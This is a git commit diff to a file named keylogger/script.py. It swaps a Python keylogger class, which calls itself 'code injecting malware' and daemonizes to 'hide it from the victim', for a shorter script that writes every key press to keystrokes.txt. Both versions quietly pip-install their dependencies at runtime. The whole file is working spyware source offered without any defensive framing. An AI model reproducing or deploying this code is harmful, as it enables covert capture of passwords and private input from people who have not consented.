0d12caa7481e56012fa9557ce648394069360667
castrosp <simao.castro@conti.de>
2024-10-01 15:35:50 +0000

    kjdvnee

--- keylogger/script.py
+++ keylogger/script.py
@@ -1,61 +1,17 @@
-#!/usr/bin/env python3
-
 import os
 
 try:
-    import daemon
-    import logging
-    import pyxhook
+    import keyboard
 except:
-    os.system("pip install python-daemon")
-    os.system("pip install logging")
-    os.system("pip install pyxhook")
-    import daemon
-    import logging
-    import pyxhook
+    os.system("pip install keyboard")
+    import keyboard
 
-class Keylogger:
-    """ This class represents the code injecting malware. """
+log_file = 'keystrokes.txt'
 
-    def __init__(self, name):
-        self._name = name
+def on_key_press(event):
+    with open(log_file, 'a') as f:
+        f.write('{}\n'.format(event.name))
 
-    @property
-    def name(self):
-        """ Name of the malware. """
-        return self._name
+keyboard.on_press(on_key_press)
 
-    @name.setter
-    def name(self, new_name):
-        self._name = new_name
-
-    def start_logging(self):
-        """ Log every keystroke of the user into log file. """
-        # Crete hook manager.
-        hook_manager = pyxhook.HookManager()
-        # Assign callback for handling key strokes.
-        hook_manager.KeyDown = self._keydown_callback
-        # Hook the keyboard and start logging.
-        hook_manager.HookKeyboard()
-        hook_manager.start()
-
-    def _keydown_callback(self, key):
-        """ This function is handler of key stroke event. """
-        logging.debug(chr(key.Ascii))
-
-if __name__ == '__main__':
-    # Setup logger.
-    logging.basicConfig(
-        level=logging.DEBUG,
-        filename='activity.log',
-        format='Key: %(message)s',
-    )
-    # Get file handler. We need to pass it to our daemon.
-    handler = logging.getLogger().handlers[0].stream
-
-    # Daemonize the process to hide it from the victim.
-    with daemon.DaemonContext(files_preserve=[handler]):
-        # Create keylogger.
-        keylogger = Keylogger('SimpleSpyware')
-        # Start logging activity of the user.
-        keylogger.start_logging()
+keyboard.wait()
